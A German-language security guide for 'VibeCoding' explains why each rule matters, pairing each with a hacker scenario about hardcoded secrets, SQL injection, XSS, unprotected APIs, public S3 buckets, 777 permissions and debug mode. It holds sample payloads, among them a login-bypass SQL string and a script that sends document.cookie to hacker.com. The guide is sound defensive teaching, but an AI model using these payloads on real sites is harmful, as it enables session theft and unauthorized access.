# VibeCoding Sicherheitsrichtlinien erklärt: Warum bestehen wir so sehr darauf?

Dieses Dokument erklärt die Wichtigkeit jeder Regel in den "Sicherheitsrichtlinien". Das Verständnis dieser hilft Ihnen, Ihren Code aus der "Hacker-Perspektive" zu betrachten und Probleme zu verhindern, bevor sie auftreten.

---

## ⭐ Goldene Regeln

### 【Niemals Geheimnisse hart kodieren】 & 【Umgebungsvariablen verwenden】 & 【Geheime Dateien ignorieren】

**Warum ist das wichtig?**

Diese drei sind die höchsten Überlebensgesetze in der digitalen Welt. Ihr Code (besonders bei Verwendung von Git) wird an mehreren Orten kopiert, geteilt und gespeichert. Passwörter, API-Schlüssel und andere "Geheimnisse" direkt in den Code zu schreiben, ist wie das Passwort Ihres Safes auf die Stirn zu tätowieren - jeder, der Sie sieht (den Code sieht), kann leicht Ihren Safe öffnen. Die `.env`-Datei ist Ihr privater Safe, und `.gitignore` ist das Sicherheitssystem, das sicherstellt, dass dieser Safe nicht versehentlich verpackt und an andere gesendet wird.

**Hacker-Drehbuch 😈**
> Ich liebe es, auf GitHub nach `password`, `api_key` oder `db_connect` zu suchen. Ich fand Ihr öffentliches Projekt und in einer Datei namens `config.js` sah ich diesen Code: `const db_password = 'Password123!';`. Großartig! Ich muss nicht einmal Ihre Website angreifen - ich kann jetzt direkt versuchen, mich mit diesem Passwort in Ihre Datenbank einzuloggen.

**Katastrophale Folgen 💥**

**Vollständige Dienstübernahme.** Hacker können alle Ihre Benutzerdaten stehlen, manipulieren oder löschen, oder Ihre bezahlten API-Dienste (z.B. Massenmails senden, Kartendienste nutzen) für illegale Aktivitäten verwenden, wobei alle Rechnungen an Sie gehen.

---

## 📥 Verarbeitung von Benutzereingaben

### 【Injection-Angriffe verhindern (SQL-Injection)】

**Warum ist das wichtig?**

Stellen Sie sich die Datenbank als einen Roboter vor, der nur SQL-Sprache versteht. Wenn Sie Benutzereingaben direkt mit Ihren Befehlen verknüpfen, haben Benutzer die Möglichkeit, ihre eigenen "Befehle" zu sprechen. Parametrisierte Abfragen sagen dem Roboter: "Hör zu, der nächste Teil ist **nur Daten** - egal was der Inhalt ist, führe es nicht als Befehle aus."

**Hacker-Drehbuch 😈**
> In der Login-Box Ihrer Website gab ich als Benutzername `' OR '1'='1' --` ein. Ich vermute, Ihre SQL-Abfrage ist so geschrieben: `"SELECT * FROM users WHERE username = '" + userInput + "';"`. Meine Eingabe verwandelte es in `SELECT * FROM users WHERE username = '' OR '1'='1' --';`. `'1'='1'` ist immer wahr, also umging ich die Passwort-Verifikation und loggte mich erfolgreich in das erste Benutzerkonto (normalerweise der Administrator) ein.

**Katastrophale Folgen 💥**

Angreifer können Login umgehen, die gesamten Datenbankdaten (Benutzerlisten, Passwort-Hashes) stehlen oder sogar die Datenbank löschen.

### 【Cross-Site-Scripting-Angriffe verhindern (XSS)】

**Warum ist das wichtig?**

Wenn Ihre Website wie ein Spiegel ist, der Benutzereingaben direkt reflektiert, können Benutzer bösartige JavaScript-Skripte in den Inhalt einbetten. Wenn andere Benutzer diesen Inhalt durchsuchen, wird das bösartige Skript in ihren Browsern ausgeführt und stiehlt ihre Informationen. HTML-Entity-Kodierung konvertiert Sonderzeichen in bösartigen Skripten (wie `<`, `>`) in harmlosen Klartext, wodurch sie nicht ausgeführt werden können.

**Hacker-Drehbuch 😈**
> Ich hinterließ einen Kommentar im Kommentarbereich Ihres Artikels: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Dieser Text wurde unverändert in der Datenbank gespeichert. Jetzt führt jeder Benutzer, der diesen Kommentar liest, automatisch dieses Skript in seinem Browser aus und sendet seine Login-Cookies an meinen Server. Mit den Cookies kann ich ihre Identität vortäuschen und mich auf der Website einloggen.

**Fortgeschrittene Angriffsmethode: Wie kann Code von Benutzer A die Daten von Benutzer B stehlen?**

Viele Menschen fragen sich: "Der Angreifer hat meine Website nicht verändert, wie kann er dann die Daten anderer Benutzer stehlen?" Lassen Sie es mich mit einem vollständigen Beispiel erklären:

1. **Angreifer A erstellt einen bösartigen Link**
   ```
   https://yoursite.com/detail.php?id=1<script>steal()</script>
   ```

2. **Angreifer täuscht Opfer B durch Social Engineering**
   - E-Mail: "Schauen Sie sich die fantastischen Arbeiten dieses Fotografen an!"
   - Social Media-Posts, Forumkommentare usw.

3. **Was passiert, wenn Opfer B auf den Link klickt?**
   ```php
   // Ihr Code (verwundbar)
   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
   
   // Tatsächliche Ausgabe in B's Browser
   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
   ```

4. **Warum können sie B's Daten stehlen?**
   - B ist bereits auf Ihrer Website eingeloggt
   - Das bösartige Skript läuft unter **Ihrer Domain**, daher kann es:
     - B's Cookies (Anmeldedaten) lesen
     - Auf B's localStorage zugreifen
     - Anfragen im Namen von B stellen
     - Seiteninhalte ändern (z.B. gefälschte Anmeldeformulare)

**Einfache Analogie**
Stellen Sie sich Ihre Website als Bank vor:
- Angreifer A platziert einen "gefälschten Überweisungsschein" (bösartiges Skript) in der Banklobby
- Kunde B denkt, es sei legitim und trägt sein Passwort ein
- A erhält B's Passwort

XSS ermöglicht es Angreifern, "gefälschte Überweisungsscheine" (bösartigen Code) in Ihrer "Banklobby" (Website) zu platzieren.

Deshalb müssen Sie `htmlspecialchars()` verwenden - es stellt sicher, dass alle Benutzereingaben als Klartext angezeigt werden, nicht als ausführbarer Code.

**Katastrophale Folgen 💥**

Großflächiger Benutzerkonten-Diebstahl, Datenschutzverletzungen, Websites werden mit Phishing-Inhalten oder Mining-Skripten infiltriert.

---

## 🔐 Berechtigungen und Authentifizierung

### 【API-Endpunkt-Schutz】

**Warum ist das wichtig?**

Frontend-Benutzeroberflächen (UI) können Schaltflächen verstecken, aber Hacker verlassen sich nie auf Benutzeroberflächen. Sie rufen Ihre Backend-APIs direkt mit Tools (wie Postman, curl) auf. Sie müssen davon ausgehen, dass jeder API-Endpunkt direkt angegriffen wird, daher muss jeder Endpunkt ein unabhängiger Wächter sein, der die Identität und Berechtigungen der Besucher selbst überprüft.

**Hacker-Drehbuch 😈**
> Ich entdeckte, dass zum Ändern persönlicher Informationen das Frontend eine Anfrage an `/api/user/update` sendet. Obwohl ich keine Änderungs-Schaltflächen anderer Personen sehen kann, vermute ich, dass diese API Benutzer über `userId` unterscheidet. Ich versuchte, eine Anfrage an `/api/user/update?userId=1` (Administrator-ID) mit den Daten zu senden, die ich ändern wollte. Mein Gott, der Server überprüfte nicht, ob die Anfrage von mir persönlich stammte, und änderte erfolgreich die E-Mail des Administrators!

**Katastrophale Folgen 💥**

Normale Benutzer können Daten anderer Benutzer oder sogar Administratoren manipulieren oder Berechtigungen ausführen, die sie nicht haben sollten, was zu Systemchaos führt.

---

## ☁️ Externe Dienste und Cloud-Integration

### 【Externe Datenbank-Firewall】 & 【Cloud-Speicher privatisieren】

**Warum ist das wichtig?**

Ihre Cloud-Datenbank und Ihr Speicherplatz sind wie Ihr privates Lager in der Cloud. Sie würden niemals die Türen Ihres Lagers weit öffnen, damit die ganze Welt hereinkommen kann. Firewalls und Privatisierungseinstellungen schaffen eine solide Mauer und verschlossene Tür für Ihr Lager und erlauben nur Ihrer Anwendung (spezifische IP-Adressen) - diesem "autorisierten Lastwagen" - ein- und auszugehen.

**Hacker-Drehbuch 😈**
> Ich scannte Ihren Firmen-IP-Bereich mit Tools und entdeckte, dass ein AWS S3-Bucket "öffentlich" ist. Ich klickte hinein und sah, dass er voller Ausweisfotos von Benutzern und gescannte Firmenverträge war. Alle Dateilisten waren auf einen Blick sichtbar, und ich lud alles herunter.

**Katastrophale Folgen 💥**

Alle gespeicherten sensiblen Daten (Benutzerpersönliche Informationen, Firmenvertrauliche Dokumente) werden auf einmal gestohlen, was zu verheerenden Datenschutzverletzungen führt.

---

## ⚙️ Dateien und Server-Konfiguration

### 【Niemals 777 verwenden】

**Warum ist das wichtig?**

Berechtigung `777` bedeutet, dass "Lesen, Schreiben, Ausführen"-Berechtigungen für "Besitzer, Gruppe, Andere" vollständig geöffnet sind. Das ist, als würden Sie Ihre Haustür unverschlossen lassen und einen Zettel ankleben mit "Willkommen für jeden, hereinzukommen, zu wohnen, zu kritzeln, Partys zu feiern". Wenn Hacker eine Datei hochladen können, gibt ihnen die `777`-Berechtigung die Macht, diese Datei auszuführen.

**Hacker-Drehbuch 😈**
> Ich entdeckte, dass die Bildupload-Funktion Ihrer Website eine kleine Schwachstelle hat und die Dateitypen, die ich hochlade, nicht strikt begrenzt. Ich lud ein bösartiges Backdoor-Programm namens `shell.php` hoch, getarnt als `image.jpg.php`. Da die Berechtigungen Ihres Upload-Verzeichnisses `777` sind, erlaubt der Server mir, diese Datei zu "ausführen". Jetzt muss ich nur `yoursite.com/uploads/shell.php` besuchen, um auf Ihrem Server zu tun, was ich will.

**Katastrophale Folgen 💥**

Server vollständig kompromittiert. Hacker können allen Code und Daten stehlen, Ihren Server in einen Zombie-Host für Cyber-Angriffe verwandeln oder Ransomware installieren.

### 【Debug-Modus deaktivieren】

**Warum ist das wichtig?**

Der Debug-Modus ist ein guter Helfer während der Entwicklung, aber in Produktionsumgebungen ist er wie ein geschwätziger Insider. Wenn die Website einen Fehler hat, zeigt er vollständig extrem sensible Informationen wie interne Serverpfade, Datenbankabfrage-Anweisungen, Konfigurationsvariablen auf Fehlerseiten an, was im Wesentlichen Hackern eine detaillierte Angriffskarte liefert.

**Hacker-Drehbuch 😈**
> Ich gab absichtlich einige Sonderzeichen in das Suchfeld Ihrer Website ein, um einen Programmfehler zu verursachen. Die Website gab sofort eine detaillierte Fehlerseite zurück, die `Error in /var/www/html/app/models/User.php on line 52` anzeigte, zusammen mit der fehlerhaften SQL-Abfrage-Anweisung. Jetzt kenne ich Ihre Dateistruktur, das verwendete Programmierframework und sogar die Namen der Datentabellen. Mein nächster Angriff wird viel präziser sein.

**Katastrophale Folgen 💥**

Lecken Sie große Mengen an internen Systeminformationen, reduzieren Sie erheblich die Angriffsschwierigkeit der Hacker und ermöglichen Sie ihnen, echte Schwachstellen schneller zu finden.